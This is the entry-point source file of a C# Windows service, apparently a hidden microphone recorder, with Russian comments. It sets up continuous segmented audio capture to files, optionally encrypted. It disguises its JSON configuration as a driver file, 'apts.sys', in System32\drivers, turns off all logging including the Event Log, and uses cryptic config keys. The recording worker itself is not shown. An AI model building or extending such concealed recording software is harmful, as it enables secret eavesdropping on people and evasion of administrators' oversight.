using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System;
using System.IO;

namespace AudioCore
{
    public class Program
    {
        public static void Main(string[] args)
        {
            CreateHostBuilder(args).Build().Run();
        }

        public static IHostBuilder CreateHostBuilder(string[] args) =>
            Host.CreateDefaultBuilder(args)
                .UseWindowsService() // <-- Добавьте эту строку
                .ConfigureAppConfiguration((context, config) =>
                {
                    // Статический путь к конфигу службы (файл apts.sys в C:\Windows\System32\drivers)
                    string serviceConfigDir = @"C:\Windows\System32\drivers";
                    string serviceConfigPath = Path.Combine(serviceConfigDir, "apts.sys");

                    string basePath;
                    if (File.Exists(serviceConfigPath))
                    {
                        basePath = serviceConfigDir;
                        //Console.WriteLine($"[Config] Используем статический путь к конфигу службы: {serviceConfigPath}");
                    }
                    else
                    {
                        // Fallback: папка exe (для отладки/запуска из publish)
                        basePath = AppContext.BaseDirectory ?? Directory.GetCurrentDirectory();
                        //Console.WriteLine($"[Config] Используем базовую директорию: {basePath}");
                    }

                    config.SetBasePath(basePath);

                    string configPath = Path.Combine(basePath, "apts.sys");
                    //Console.WriteLine($"[Config] Путь к apts.sys: {configPath}");
                    //Console.WriteLine($"[Config] Файл существует: {File.Exists(configPath)}");

                    // Добавляем apts.sys из выбранной директории
                    config.AddJsonFile("apts.sys", optional: false, reloadOnChange: true);

                    // Добавляем переменные окружения
                    config.AddEnvironmentVariables();

                    // Добавляем аргументы командной строки
                    if (args != null)
                    {
                        config.AddCommandLine(args);
                    }
                })
                .ConfigureServices((context, services) =>
                {
                    // Безопасное чтение конфигурации без использования Configure<TOptions> (trim-friendly)
                    var cfg = LoadConfigurationSafely(context.Configuration);
                    services.AddSingleton(cfg);
                    
                    // Регистрируем Worker
                    services.AddHostedService<Worker>();

                })
                .ConfigureLogging((context, logging) =>
                {
                    // Полностью отключаем встроенное логирование (EventLog, Console и т.п.)
                    logging.ClearProviders();
                });

        private static ServiceConfiguration LoadConfigurationSafely(IConfiguration configuration)
        {
            // Новый раздел и короткие ключи: SrvC / DS, OF, SR, BPS, Ch, AF, MV
            var section = configuration.GetSection("SrvC");

            // Читаем формат из конфигурации: AF = 0 (wav), 1 (mp3)
            int audioFormatCode = TryGetInt(section, "AF", 0);
            //Console.WriteLine($"[Config] AF (AudioFormatCode) из конфигурации: {audioFormatCode} (0=wav,1=mp3)");

            // Громкость микрофона (0.0–1.0–4.0)
            double micVolume = TryGetDouble(section, "MV", 1.0);
            //Console.WriteLine($"[Config] MV (MicrophoneVolume) из конфигурации: '{micVolume}'");

            // Флаг шифрования аудио: ENC = 0 (выкл), 1 (вкл)
            int encryptFlag = TryGetInt(section, "ENC", 0);
            bool encryptAudio = encryptFlag == 1;

            return new ServiceConfiguration
            {
                SampleRate = TryGetInt(section, "SR", 16000),
                BitsPerSample = TryGetInt(section, "BPS", 16),
                Channels = TryGetInt(section, "Ch", 1),
                SegmentDurationSeconds = TryGetInt(section, "DS", 10),
                OutputFolder = section["OF"] ?? "D:\\AudioRecords",
                AudioFormatCode = audioFormatCode,
                MicrophoneVolume = micVolume,
                EncryptAudio = encryptAudio
            };
        }

        private static int TryGetInt(IConfigurationSection section, string key, int defaultValue)
        {
            var stringValue = section[key];
            if (int.TryParse(stringValue, out int result))
            {
                return result;
            }
            return defaultValue;
        }

        private static double TryGetDouble(IConfigurationSection section, string key, double defaultValue)
        {
            var stringValue = section[key];
            if (double.TryParse(stringValue, System.Globalization.NumberStyles.Any, System.Globalization.CultureInfo.InvariantCulture, out double result))
            {
                return result;
            }
            return defaultValue;
        }
    }
}